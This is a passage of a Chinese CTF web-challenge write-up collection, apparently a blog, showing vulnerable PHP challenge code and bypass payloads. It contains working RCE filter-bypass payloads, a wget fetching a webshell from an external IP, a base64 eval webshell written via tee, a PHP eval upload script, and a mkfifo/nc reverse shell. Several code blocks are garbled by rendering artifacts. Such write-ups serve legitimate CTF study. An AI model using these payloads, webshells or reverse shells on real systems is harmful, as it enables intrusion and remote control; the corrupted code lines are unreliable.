玩原神玩的</h2><p>第一层：判断传的数组是否和array数组大小相等，爆破大小绕过</p><p>第二层：传入 我要玩原神 即可</p><p>第三层：传入m数组，其中m[0]是字符串100%，m[1]是字符串love100%拼接m[0]的md5值。%要url编码</p><p>第四层：将给定的md5数组与当前索引异或，得到flag</p><p>python脚本:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">url=&#x27;http://challenge.basectf.fun:46462/?tip=我要玩原神&#x27;</span><br><span class="line">payload=&#x27;&#x27;</span><br><span class="line">for i in range(45):</span><br><span class="line"> payload+=&#x27;len[&#x27;+str(i)+&#x27;]=0&amp;&#x27;</span><br><span class="line"># print(payload)</span><br><span class="line">header=&#123;&#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;&#125;</span><br><span class="line">payload+=&#x27;m[0]=100%25&amp;m[1]=love100%2530bd7ce7de206924302499f197c7a966&#x27;</span><br><span class="line"># %需要编码</span><br><span class="line"></span><br><span class="line">res=requests.post(url=url,data=payload,headers=header)</span><br><span class="line">print(res.text)</span><br><span class="line">#得到flag与索引异或的md5值</span><br><span class="line"></span><br><span class="line">flag_enc=[&quot;3295c76acbf4caaed33c36b1b5fc2cb1&quot;,&quot;26657d5ff9020d2abefe558796b99584&quot;,&quot;73278a4a86960eeb576a8fd4c9ec6997&quot;,&quot;ec8956637a99787bd197eacd77acce5e&quot;,&quot;e2c420d928d4bf8ce0ff2ec19b371514&quot;,&quot;43ec517d68b6edd3015b3edc9a11367b&quot;,&quot;ea5d2f1c4608232e07d3aa3d998e5135&quot;,&quot;c8ffe9a587b126f152ed3d89a146b445&quot;,&quot;072b030ba126b2f4b2374f342be9ed44&quot;,&quot;093f65e080a295f8076b1c5722a46aa2&quot;,&quot;a3c65c2974270fd093ee8a9bf8ae7d0b&quot;,&quot;2723d092b63885e0d7c260cc007e8b9d&quot;,&quot;72b32a1f754ba1c09b3695e0cb6cde7f&quot;,&quot;072b030ba126b2f4b2374f342be9ed44&quot;,&quot;698d51a19d8a121ce581499d7b701668&quot;,&quot;72b32a1f754ba1c09b3695e0cb6cde7f&quot;,&quot;7f39f8317fbdb1988ef4c628eba02591&quot;,&quot;a5771bce93e200c36f7cd9dfd0e5deaa&quot;,&quot;a5bfc9e07964f8dddeb95fc584cd965d&quot;,&quot;a5bfc9e07964f8dddeb95fc584cd965d&quot;,&quot;f7177163c833dff4b38fc8d2872f1ec6&quot;,&quot;9f61408e3afb633e50cdf1b20de6f466&quot;,&quot;e369853df766fa44e1ed0ff613f563bd&quot;,&quot;73278a4a86960eeb576a8fd4c9ec6997&quot;,&quot;182be0c5cdcd5072bb1864cdee4d3d6e&quot;,&quot;da4fb5c6e93e74d3df8527599fa62642&quot;,&quot;b53b3a3d6ab90ce0268229151c9bde11&quot;,&quot;4c56ff4ce4aaf9573aa5dff913df997a&quot;,&quot;f7177163c833dff4b38fc8d2872f1ec6&quot;,&quot;ec5decca5ed3d6b8079e2e7e7bacc9f2&quot;,&quot;d9d4f495e875a2e075a1a4a6e1b9770f&quot;,&quot;c0c7c76d30bd3dcaefc96f40275bdc0a&quot;,&quot;3295c76acbf4caaed33c36b1b5fc2cb1&quot;,&quot;ea5d2f1c4608232e07d3aa3d998e5135&quot;,&quot;735b90b4568125ed6c3f678819b6e058&quot;,&quot;7cbbc409ec990f19c78c75bd1e06f215&quot;,&quot;3295c76acbf4caaed33c36b1b5fc2cb1&quot;,&quot;e2c420d928d4bf8ce0ff2ec19b371514&quot;,&quot;70efdf2ec9b086079795c442636b55fb&quot;,&quot;c16a5320fa475530d9583c34fd356ef5&quot;,&quot;6ea9ab1baa0efb9e19094440c317e21b&quot;,&quot;02e74f10e0327ad868d138f2b4fdd6f0&quot;,&quot;d1fe173d08e959397adf34b1d77e88d7&quot;,&quot;34173cb38f07f89ddbebc2ac9128303f&quot;,&quot;43ec517d68b6edd3015b3edc9a11367b&quot;]</span><br><span class="line"></span><br><span class="line">flag=&#x27;&#x27;</span><br><span class="line">for i in range(45):</span><br><span class="line">    for j in range(126):</span><br><span class="line">        if((hashlib.md5(str(j^i).encode(&#x27;utf-8&#x27;))).hexdigest()==flag_enc[i]):</span><br><span class="line">            flag+=chr(j)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br><span class="line"># BaseCTF&#123;42ff51a6-7768-4f9a-b0b0-baaefb7852e5&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ISCTF-ezrce"><a href="#ISCTF-ezrce" class="headerlink" title="ISCTF ezrce"></a>ISCTF ezrce</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;cmd&#x27;])) &#123;</span><br><span class="line">    $cmd = $_GET[&#x27;cmd&#x27;];</span><br><span class="line"></span><br><span class="line">    if (preg_match(&quot;/flag|cat|ls|echo|php|bash|sh|more| |less|head|tail|[\|\&amp;\&gt;\&lt;]|eval|system|exec|popen|shell_exec/i&quot;, $cmd)) &#123;</span><br><span class="line">        die(&quot;Blocked by security filter!&quot;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        eval($cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>利用无数字字母 rce 之取反，即可绕过。脚本如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$system=&#x27;system&#x27;;</span><br><span class="line">$command=&#x27;cat /flag&#x27;;</span><br><span class="line">echo &#x27;(~&#x27;.urlencode(~$system).&#x27;)(~&#x27;.urlencode(~$command).&#x27;);&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>payload 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?cmd=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%9E%98);</span><br><span class="line">或者</span><br><span class="line">?cmd=include$_GET[1];&amp;1=php://filter/convert.base64-encode/resource=/flag</span><br></pre></td></tr></table></figure><h2 id="ISCTF-千年樱"><a href="#ISCTF-千年樱" class="headerlink" title="ISCTF  千年樱"></a>ISCTF  千年樱</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;dir.php&quot;;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">function waf($str)&#123;</span><br><span class="line">    if(preg_match(&quot;/http|php|file|:|=|\/|\?/i&quot;, $str) )&#123;</span><br><span class="line">        die(&#x27;bad hacker!!!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$poc = $_POST[&#x27;poc&#x27;];</span><br><span class="line">waf($poc);</span><br><span class="line">$filename = &quot;php://filter/$poc/resource=/var/www/html/badChar.txt&quot;;</span><br><span class="line">$result = file_get_contents($filename);</span><br><span class="line">if($result === &quot;sakura for ISCTF&quot;)&#123;</span><br><span class="line">    echo &quot;yes! master!&quot;;</span><br><span class="line">    eval($_POST[&#x27;cmd&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($_GET[&#x27;output&#x27;] == 114514 &amp;&amp; !is_numeric($_GET[&#x27;output&#x27;]))&#123;</span><br><span class="line">    var_dump($result);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>1.代码审计需要伪造badchar.txt里的数据为sakura for ISCTF</p><p>2.使用工具 php_filter_chain 进行伪造，工具地址如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/synacktiv/php_filter_chain_generatorhttps://github.com/synacktiv/php_filter_chain_generator</span><br></pre></td></tr></table></figure><p>3.生成命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python php_filter_chain_generator.py --chain &quot;sakura for ISCTF&lt;?php&quot;</span><br></pre></td></tr></table></figure><p><code>&lt;?php是 为了在 PHP 代码中形成有效的 PHP 代码段</code></p><p>生成后去除php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF8.CSISO2022KR|</p><p>按照文章所说，直接打的话后面会有脏数据，手动加 |string.strip_tags 过滤器来去除php标签<br>按照要求传参绕过，然后正常命令执行得到 flag</p><h2 id="禁用-b-h-m-r"><a href="#禁用-b-h-m-r" class="headerlink" title="禁用[b-h]|[m-r]"></a>禁用<code>[b-h]|[m-r]</code></h2><p>可用?emo&#x3D;tail%09??a?.txt</p><h2 id="数字白名单"><a href="#数字白名单" class="headerlink" title="数字白名单"></a>数字白名单</h2><p>构造八进制命令执行</p><p><a href="https://config.net.cn/tools/TextToBit8.html">在线字符串转八进制</a></p><p>注意第一个字符前面也要加\</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=$0&lt;&lt;&lt;$&#x27;八进制值&#x27;</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=$0&lt;&lt;&lt;$%27\143\141\164\040\057\146\154\141\147%27</span><br></pre></td></tr></table></figure><h2 id="XYCTF牢牢记住，逝者为大"><a href="#XYCTF牢牢记住，逝者为大" class="headerlink" title="XYCTF牢牢记住，逝者为大"></a>XYCTF牢牢记住，逝者为大</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">function Kobe($cmd)</span><br><span class="line">&#123;</span><br><span class="line">    if (strlen($cmd) &gt; 13) &#123;</span><br><span class="line">        die(&quot;see you again~&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if (preg_match(&quot;/echo|exec|eval|system|fputs|\.|\/|\\|/i&quot;, $cmd)) &#123;</span><br><span class="line">        die(&quot;肘死你&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    foreach ($_GET as $val_name =&gt; $val_val) &#123;</span><br><span class="line">        if (preg_match(&quot;/bin|mv|cp|ls|\||f|a|l|\?|\*|\&gt;/i&quot;, $val_val)) &#123;</span><br><span class="line">            return &quot;what can i say&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $cmd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$cmd = Kobe($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">echo &quot;#man,&quot; . $cmd  . &quot;,manba out&quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">eval(&quot;#man,&quot; . $cmd . &quot;,mamba out&quot;);</span><br></pre></td></tr></table></figure><p>1.为了命令执行，我们需要做的就是换行和注释掉mamba out</p><p>2.关于命令执行，因为限长，所以考虑用<code>$_GET[1]</code>来转接</p><p>3.但对GET有诸多限制，连curl都打不了，考虑写马 写马有两种方式，一种echo &gt;，另一种直接wget下载远程文件，本题显然是后者</p><p>4.payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=%0a`$_GET[1]`;%23&amp;1=wget 124.222.136.33:1337/yjh.php</span><br></pre></td></tr></table></figure><p>%0a换行,%23注释 成功写马，命令执行拿到flag</p><h2 id="利用花括号或正则匹配绕过"><a href="#利用花括号或正则匹配绕过" class="headerlink" title="利用花括号或正则匹配绕过"></a>利用花括号或正则匹配绕过</h2><p>ISCTF2023fuzz!</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/*</span><br><span class="line">Read /flaggggggg.txt</span><br><span class="line">Hint: 你需要学会fuzz，看着键盘一个一个对是没有灵魂的</span><br><span class="line">知识补充：curl命令也可以用来读取文件哦，如curl file:///etc/passwd</span><br><span class="line">*/</span><br><span class="line">error_reporting(0);</span><br><span class="line">header(&#x27;Content-Type: text/html; charset=utf-8&#x27;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">&lt; Invalid Mathematical Formula &gt;&lt; Invalid Mathematical Formula &gt;$file = &#x27;file:///etc/passwd&#x27;;</span><br><span class="line">if(preg_match(&quot;/\`|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\+|\=|\\\\|\&#x27;|\&quot;|\;|\&lt;|\&gt;|\,|\?|jay/i&quot;, &lt; Invalid Mathematical Formula &gt;&lt; Invalid Mathematical Formula &gt;$_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    die(&#x27;你需要fuzz一下哦~&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">if(!preg_match(&quot;/fi|le|flag/i&quot;, $_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    &lt; Invalid Mathematical Formula &gt;&lt; Invalid Mathematical Formula &gt;$file = $_GET[&#x27;file&#x27;];</span><br><span class="line">&#125;</span><br><span class="line">system(&#x27;curl &#x27;.&lt; Invalid Mathematical Formula &gt;&lt; Invalid Mathematical Formula &gt;$file);</span><br></pre></td></tr></table></figure><p><strong>这里过滤禁用了一大堆的符号，但是<code>&#39;&#123;&#39;</code>,<code>&#39;&#125;&#39;</code>,<code>&#39;[&#39;</code>,<code>&#39;]&#39;</code>没有被过滤禁用</strong></p><p><strong>这里对我们的<code>file</code>做了处理，而且还过滤了flag</strong></p><p><strong>现在来构造我们的payload：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=&#123;f&#125;i&#123;l&#125;e:///fl&#123;a&#125;ggggggg.txt</span><br></pre></td></tr></table></figure><p><strong><code>file:///</code> 表示指向本地文件系统的根目录。在使用这个 URL Scheme 时，通常会在 <code>file:///</code> 后面添加文件的路径来指定要访问的文件。例如，<code>file:///path/to/file.txt</code> 表示指向文件系统中 <code>/path/to/file.txt</code> 这个文件的路径</strong></p><p><strong>或者正则匹配绕过：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=f[i-i]l[e-e]:///fl[a-a]ggggggg.txt</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=http://www.baidu.dom|echo PD9waHAgZXZhbCgkX1BPU1RbMTExXSk7|base64 -d | tee 1.php</span><br></pre></td></tr></table></figure><p>访问1.php后执行命令</p><h2 id="BaseCTF-ez-php-jail"><a href="#BaseCTF-ez-php-jail" class="headerlink" title="BaseCTF_ez_php_jail"></a>BaseCTF_ez_php_jail</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;hint.html&quot;);</span><br><span class="line">$Jail = $_GET[&#x27;Jail_by.Happy&#x27;];</span><br><span class="line"></span><br><span class="line">if($Jail == null) die(&quot;Do You Like My Jail?&quot;);</span><br><span class="line"></span><br><span class="line">function Like_Jail($var) &#123;</span><br><span class="line">    if (preg_match(&#x27;/(`|\$|a|c|s|require|include)/i&#x27;, $var)) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (Like_Jail(&lt; Invalid Mathematical Formula &gt;&lt; Invalid Mathematical Formula &gt;$Jail)) &#123;</span><br><span class="line">    eval($Jail);</span><br><span class="line">    echo &quot;Yes! you escaped from the jail! LOL!&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;You will Jail in your life!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;\n&quot;;</span><br></pre></td></tr></table></figure><p>1.首先先看提交的参数，<code>Jail_by.Happy</code>，这个不是一个合法的参数，所以需要对其合理化,将前面的 _ 替换为[即可</p><p>2.这个就是一个rce，但是这里禁用了很多的东西，可以通过提交 phpinfo(); 来查看信息</p><p>3.这里还禁用了许多的字母和字符，我们就可以通过使用<strong>php内置函数</strong>来进行绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?Jail[by.Happy=print_r(glob(&#x27;/f*&#x27;));</span><br><span class="line">?Jail[by.Happy=print_r(implode(glob(&#x27;/f*&#x27;)));//这里来读取数组里面的内容</span><br><span class="line">?Jail[by.Happy=highlight_file(implode(glob(&#x27;/f*&#x27;)));</span><br><span class="line">?Jail[by.Happy=highlight_file(glob(&#x27;/f*&#x27;)[0]);</span><br></pre></td></tr></table></figure><h2 id="LitCTF-2024-百万美元的诱惑"><a href="#LitCTF-2024-百万美元的诱惑" class="headerlink" title="[LitCTF 2024]百万美元的诱惑"></a>[LitCTF 2024]百万美元的诱惑</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//flag in 12.php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset(&lt; Invalid Mathematical Formula &gt;&lt; Invalid Mathematical Formula &gt;$_GET[&#x27;x&#x27;]))&#123;</span><br><span class="line">    $x = x=x = x=x=x=x=x=x = x=x = x=x=x=x=x=$_GET[&#x27;x&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/[a-z0-9;`|#&#x27;\&quot;%&amp;\x09\x0a&gt;&lt;.,?*\-=\\[\]]/i&quot;, $x))&#123;</span><br><span class="line">            system(&quot;cat &quot;.&lt; Invalid Mathematical Formula &gt;&lt; Invalid Mathematical Formula &gt;$x.&quot;.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>能过滤的都过滤了,这里用$(())来进行构造（代表0）</p><p>使用二进制取反如果正数的话1取反为0</p><p>正数取反为本身加1的负数</p><p>负数取反为其本身加1的绝对值，0取反为-1，-1取反为0</p><p>脚本如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">get_reverse_number = &quot;$((~$((&#123;&#125;))))&quot; # 取反操作</span><br><span class="line">negative_one = &quot;$((~$(())))&quot;    # -1</span><br><span class="line">payload = get_reverse_number.format(negative_one*13)</span><br><span class="line">print(payload)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="SWPUCTF-2024-秋季新生赛-未选择的路"><a href="#SWPUCTF-2024-秋季新生赛-未选择的路" class="headerlink" title="[SWPUCTF 2024 秋季新生赛]未选择的路"></a>[SWPUCTF 2024 秋季新生赛]未选择的路</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">//一片森林里分出两条路————而我选择了人迹更少的一条，从此决定了我一生的道路。</span><br><span class="line">Include(&#x27;check.php&#x27;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">$A=$_GET[&#x27;easy&#x27;];</span><br><span class="line">$B=$_GET[&#x27;hard&#x27;];</span><br><span class="line"></span><br><span class="line">if (isset($A))&#123;</span><br><span class="line">eval(&#x27;e&#x27;.&#x27;x&#x27;.&#x27;i&#x27;.&#x27;t&#x27;.&#x27;(); ?&gt;</span><br><span class="line"></span><br><span class="line">&#x27;.$A.&#x27;&lt;?php ;&#x27;);//这条路没有任何过滤诶，是不是好走一些</span><br><span class="line">&#125;</span><br><span class="line">if (isset($B))&#123;</span><br><span class="line">check($B);//要被正则了，嘤嘤嘤</span><br><span class="line">eval(&quot;#cmd&quot;.$B.&quot;inject&quot;);//这条路怎么还要禁我东西啊，真下头</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>1.读下代码，输个hard&#x3D;system试一下咯。</p><p>2.返回提示说passthru和system都禁⽤了，但是其他都能⽤，用反引号加?&gt;闭合的方法哈,payload这样写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?hard=?&gt;&lt;?php echo `ls`;?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="GHCTF-2024-PermissionDenied"><a href="#GHCTF-2024-PermissionDenied" class="headerlink" title="[GHCTF 2024]PermissionDenied"></a>[GHCTF 2024]PermissionDenied</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function blacklist($file)&#123;</span><br><span class="line">    $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;php1&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;pHp&quot;,&quot;pHp5&quot;,&quot;pHp4&quot;,&quot;pHp3&quot;,&quot;pHp2&quot;,&quot;pHp1&quot;,&quot;Html&quot;,&quot;Htm&quot;,&quot;pHtml&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;jSp&quot;,&quot;jSpx&quot;,&quot;jSpa&quot;,&quot;jSw&quot;,&quot;jSv&quot;,&quot;jSpf&quot;,&quot;jHtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;aSp&quot;,&quot;aSpx&quot;,&quot;aSa&quot;,&quot;aSax&quot;,&quot;aScx&quot;,&quot;aShx&quot;,&quot;aSmx&quot;,&quot;cEr&quot;,&quot;sWf&quot;,&quot;swf&quot;,&quot;ini&quot;);</span><br><span class="line">    $ext = pathinfo($file, PATHINFO_EXTENSION);</span><br><span class="line">    foreach ($deny_ext as $value) &#123;</span><br><span class="line">        if (stristr($ext, $value))&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_FILES[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $filename = urldecode($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">    $filecontent = file_get_contents($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]);</span><br><span class="line">    if(blacklist($filename))&#123;</span><br><span class="line">        file_put_contents($filename, $filecontent);</span><br><span class="line">        echo &quot;Success!!!&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;Hacker!!!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>file_put_content函数有一个文件解析的漏洞</p><p><code>当上传</code>123.php&#x2F;.<code>的时候，file_put_contents函数会认为是要在123.php文件所在的目录下创建一个名为</code>.<code>的文件，最终上传创建的是123.php</code></p><p>1.123.php内容:<?php eval($_POST[0]);phpinfo();?></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://node6.anna.nssctf.cn:22921/&quot;</span><br><span class="line">file = &#123;</span><br><span class="line">    &quot;file&quot;:(&quot;123.php%2f.&quot;,open(&#x27;1.php&#x27;,&#x27;r&#x27;))</span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url=url,files=file).text</span><br><span class="line">print(res)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2.蚁剑连接进去以后，可以发现无法执行命令</p><p>3.查看phpinfo信息，发现命令执行函数被禁用了</p><p>4.那我们只能使用蚁剑的插件了:UserFilter</p><p>5.成功命令执行，那我们就反弹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc xxx.xxx.xxx.xxx 8989 &gt;/tmp/f</span><br></pre></td></tr></table></figure><h2 id="未过滤exec、nl、tee、print、var-dump、include"><a 